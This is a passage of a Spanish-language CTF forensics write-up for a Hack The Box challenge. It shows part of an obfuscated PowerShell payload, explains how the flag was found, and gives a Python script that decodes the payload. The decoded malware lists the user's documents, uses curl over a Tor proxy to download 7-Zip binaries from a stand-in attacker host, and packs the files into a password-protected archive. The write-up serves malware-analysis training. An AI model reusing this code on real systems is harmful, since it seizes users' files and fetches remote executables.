+ [char]114 + [char]103 + [char]79 + [char]117 + [char]116 + [char]32 + [char]61 + [char]32 + [char]39 + [char]68 + [char]101 + [char]115 + [char]107 + [char]116 + [char]111 + [char]112 + [char]92 + [char]65 + [char]108 + [char]108 + [char]89 + [char]111 + [char]117 + [char]114 + [char]82 + [char]101 + [char]108 + [char]105 + [char]107 + [char]82 + [char]101 + [char]115 + [char]101 + [char]97 + [char]114 + [char]99 + [char]104 + [char]72 + [char]97 + [char]104 + [char]97 + [char]104 + [char]97 + [char]95 + [char]123 + [char]48 + [char]125 + [char]46 + [char]122 + [char]105 + [char]112 + [char]39 + [char]32 + [char]45 + [char]102 + [char]32 + [char]40 + [char]71 + [char]101 + [char]116 + [char]45 + [char]82 + [char]97 + [char]110 + [char]100 + [char]111 + [char]109 + [char]32 + [char]45 + [char]77 + [char]105 + [char]110 + [char]105 + [char]109 + [char]117 + [char]109 + [char]32 + [char]49 + [char]48 + [char]48 + [char]48 + [char]48 + [char]48 + [char]32 + [char]45 + [char]77 + [char]97 + [char]120 + [char]105 + [char]109 + [char]117 + [char]109 + [char]32 + [char]50 + [char]48 + [char]48 + [char]48 + [char]48 + [char]48 + [char]41 + [char]46 + [char]84 + [char]111 + [char]83 + [char]116 + [char]114 + [char]105 + [char]110 + [char]103 + [char]40 + [char]41 + [char]59 + [char]10 + [char]32 + [char]32 + [char]32 + [char]32 + [char]36 + [char]97 + [char]114 + [char]103 + [char]80 + [char]97 + [char]115 + [char]115 + [char]32 + [char]61 + [char]32 + [char]39 + [char]45 + [char]112 + [char]39 + [char]32 + [char]43 + [char]32 + [char]36 + [char]80 + [char]97 + [char]115 + [char]115 + [char]59 + [char]10 + [char]10 + [char]32 + [char]32 + [char]32 + [char]32 + [char]83 + [char]116 + [char]97 + [char]114 + [char]116 + [char]45 + [char]80 + [char]114 + [char]111 + [char]99 + [char]101 + [char]115 + [char]115 + [char]32 + [char]45 + [char]87 + [char]105 + [char]110 + [char]100 + [char]111 + [char]119 + [char]83 + [char]116 + [char]121 + [char]108 + [char]101 + [char]32 + [char]72 + [char]105 + [char]100 + [char]100 + [char]101 + [char]110 + [char]32 + [char]45 + [char]87 + [char]97 + [char]105 + [char]116 + [char]32 + [char]45 + [char]70 + [char]105 + [char]108 + [char]101 + [char]80 + [char]97 + [char]116 + [char]104 + [char]32 + [char]36 + [char]116 + [char]109 + [char]112 + [char]39 + [char]92 + [char]55 + [char]122 + [char]46 + [char]101 + [char]120 + [char]101 + [char]39 + [char]32 + [char]45 + [char]65 + [char]114 + [char]103 + [char]117 + [char]109 + [char]101 + [char]110 + [char]116 + [char]76 + [char]105 + [char]115 + [char]116 + [char]32 + [char]39 + [char]97 + [char]39 + [char]44 + [char]32 + [char]36 + [char]97 + [char]114 + [char]103 + [char]79 + [char]117 + [char]116 + [char]44 + [char]32 + [char]39 + [char]45 + [char]114 + [char]39 + [char]44 + [char]32 + [char]36 + [char]97 + [char]114 + [char]103 + [char]69 + [char]120 + [char]116 + [char]101 + [char]110 + [char]115 + [char]105 + [char]111 + [char]110 + [char]115 + [char]44 + [char]32 + [char]36 + [char]97 + [char]114 + [char]103 + [char]80 + [char]97 + [char]115 + [char]115 + [char]32 + [char]45 + [char]69 + [char]114 + [char]114 + [char]111 + [char]114 + [char]65 + [char]99 + [char]116 + [char]105 + [char]111 + [char]110 + [char]32 + [char]83 + [char]116 + [char]111 + [char]112 + [char]59 + [char]10 + [char]125 + [char]10 + [char]10 + [char]36 + [char]80 + [char]97 + [char]115 + [char]115 + [char]32 + [char]61 + [char]32 + [char]109 + [char]97 + [char]107 + [char]101 + [char]80 + [char]97 + [char]115 + [char]115 + [char]59 + [char]10 + [char]36 + [char]102 + [char]105 + [char]108 + [char]101 + [char]76 + [char]105 + [char]115 + [char]116 + [char]32 + [char]61 + [char]32 + [char]64 + [char]40 + [char]109 + [char]97 + [char]107 + [char]101 + [char]70 + [char]105 + [char]108 + [char]101 + [char]76 + [char]105 + [char]115 + [char]116 + [char]41 + [char]59 + [char]10 + [char]36 + [char]102 + [char]105 + [char]108 + [char]101 + [char]82 + [char]101 + [char]115 + [char]117 + [char]108 + [char]116 + [char]32 + [char]61 + [char]32 + [char]109 + [char]97 + [char]107 + [char]101 + [char]70 + [char]105 + [char]108 + [char]101 + [char]76 + [char]105 + [char]115 + [char]116 + [char]84 + [char]97 + [char]98 + [char]108 + [char]101 + [char]32 + [char]36 + [char]102 + [char]105 + [char]108 + [char]101 + [char]76 + [char]105 + [char]115 + [char]116 + [char]59 + [char]10 + [char]99 + [char]111 + [char]109 + [char]112 + [char]114 + [char]101 + [char]115 + [char]115 + [char]32 + [char]36 + [char]80 + [char]97 + [char]115 + [char]115 + [char]59 + [char]10 + [char]36 + [char]84 + [char]111 + [char]112 + [char]83 + [char]101 + [char]99 + [char]114 + [char]101 + [char]116 + [char]67 + [char]111 + [char]100 + [char]101 + [char]84 + [char]111 + [char]68 + [char]105 + [char]115 + [char]97 + [char]98 + [char]108 + [char]101 + [char]83 + [char]99 + [char]114 + [char]105 + [char]112 + [char]116 + [char]32 + [char]61 + [char]32 + [char]34 + [char]72 + [char]84 + [char]66 + [char]123 + [char]89 + [char]48 + [char]85 + [char]95 + [char]67 + [char]52 + [char]110 + [char]116 + [char]95 + [char]83 + [char]116 + [char]48 + [char]112 + [char]95 + [char]84 + [char]104 + [char]51 + [char]95 + [char]65 + [char]108 + [char]108 + [char]105 + [char]52 + [char]110 + [char]99 + [char]51 + [char]125 + [char]34 + [char]10 | iex"| iex

echo $x
```

Gracias al debugger de powershell podemos ver que hay una variable que nos llama la atención:

![](https://raw.githubusercontent.com/yoshlsec/page-images/main/Challenges%20HTB%20Forensics/Pasted%20image%2020240510141110.png)
Si le hacemos un print nos encontramos con la flag!!!

```powershell
PS C:\Users\yoshl> $TopSecretCodeToDisableScript

HTB{Y0U_C4nt_St0p_Th3_Alli4nc3}
```

Pensé que no era seguro hacerlo de esta manera, y tras un poco de investigación y programación en python, hice este código para mostrar en pantalla todo el código:

```python
with open('chars.txt', 'r') as file:
	input_str = file.read()
output_str = '' 

for char in input_str.split(' + '):
	char = char.strip('[Char]')
	output_str += chr(int(char))

print(output_str)
```

Y como output el comando nos da:

```python
### .     .       .  .   . .   .   . .    +  .
###   .     .  :     .    .. :. .___---------___.
###        .  .   .    .  :.:. _".^ .^ ^.  '.. :"-_. .
###     .  :       .  .  .:../:            . .^  :.:\.
###         .   . :: +. :.:/: .   .    .        . . .:\
###  .  :    .     . _ :::/:                         .:\
###   .. . .   . - : :.:./.                           .:\
###  .   .     : . : .:.|. ######               #######::|
###   :.. .  :-  : .:  ::|.#######             ########:|
###  .  .  .  ..  .  .. :\ ########           ######## :/
###   .        .+ :: : -.:\ ########         ########.:/
###     .  .+   . . . . :.:\. #######       #######..:/
###       :: . . . . ::.:..:.\                   ..:/
###    .   .   .  .. :  -::::.\.       | |       .:/
###       .  :  .  .  .-:.":.::.\               .:/
###  .      -.   . . . .: .:::.:.\            .:/
### .   .   .  :      : ....::_:..:\   ___   :/
###    .   .  .   .:. .. .  .: :.:.:\       :/
###      +   .   .   : . ::. :.:. .:.|\  .:/|
### SCRIPT TO DELAY HUMAN RESEARCH ON RELIC RECLAMATION
### STAY QUIET - HACK THE HUMANS - STEAL THEIR SECRETS - FIND THE RELIC
### GO ALLIENS ALLIANCE !!!
function makePass
{
    $alph=@();
    65..90|foreach-object{$alph+=[char]$_};
    $num=@();
    48..57|foreach-object{$num+=[char]$_};
    
    $res = $num + $alph | Sort-Object {Get-Random};
    $res = $res -join '';
    return $res; 
}

function makeFileList
{
    $files = cmd /c where /r $env:USERPROFILE *.pdf *.doc *.docx *.xls *.xlsx *.pptx *.ppt *.txt *.csv *.htm *.html *.php;
    $List = $files -split '\r';
    return $List;
}

function compress($Pass)
{
    $tmp = $env:TEMP;
    $s = 'https://relic-reclamation-anonymous.alien:1337/prog/';
    $link_7zdll = $s + '7z.dll';
    $link_7zexe = $s + '7z.exe';
    
    $7zdll = '"'+$tmp+'\7z.dll"';
    $7zexe = '"'+$tmp+'\7z.exe"';
    cmd /c curl -s -x socks5h://localhost:9050 $link_7zdll -o $7zdll;
    cmd /c curl -s -x socks5h://localhost:9050 $link_7zexe -o $7zexe;
    
    $argExtensions = '*.pdf *.doc *.docx *.xls *.xlsx *.pptx *.ppt *.txt *.csv *.htm *.html *.php';

    $argOut = 'Desktop\AllYourRelikResearchHahaha_{0}.zip' -f (Get-Random -Minimum 100000 -Maximum 200000).ToString();
    $argPass = '-p' + $Pass;

    Start-Process -WindowStyle Hidden -Wait -FilePath $tmp'\7z.exe' -ArgumentList 'a', $argOut, '-r', $argExtensions, $argPass -ErrorA
ction Stop;
}

$Pass = makePass;
$fileList = @(makeFileList);
$fileResult = makeFileListTable $fileList;
compress $Pass;
$TopSecretCodeToDisableScript = "HTB{Y0U_C4nt_St0p_Th3_Alli4nc3}"
```

---
Otra manera de montar el disco desde powershell era:

```powershell
Mount-DiskImage -Access ReadOnly -ImagePath C:\ws\vm\shared\2023-03-09T132449_PANDORA.vhdx
```